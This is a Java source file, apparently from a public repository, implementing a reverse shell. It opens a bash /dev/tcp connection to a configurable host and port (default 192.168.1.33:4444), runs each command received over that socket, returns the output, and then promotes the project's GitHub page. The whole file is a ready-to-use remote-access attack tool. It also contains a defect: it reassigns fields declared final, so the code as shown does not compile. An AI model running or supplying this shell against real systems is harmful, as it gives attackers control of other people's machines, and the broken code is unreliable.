/**
 *
 * @author Julien Descannevelle
 */
public class Shell {

    private static final String host = "192.168.1.33"; //CHANGE THIS FOR YOUR IP
    private static final String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
	host = args[0];
	port = args[1];

        try {
            System.out.println("Init connection to " + host +":"+port);
            Runtime r = Runtime.getRuntime();
            String[] cmd = {"/bin/bash", "-c", "exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process p = r.exec(cmd);
            p.waitFor();
        } catch (Exception ex) {
            System.err.println(ex.getMessage());
        }
        System.out.println("Connection close");
        System.out.println("Hope you enjoyed it!");
        System.out.println("Please visit https://github.com/julien-desca/Java-ReverseShell and leave a star !");
        System.out.println("\t\t\t\t\t Manchalais.");
    }

}

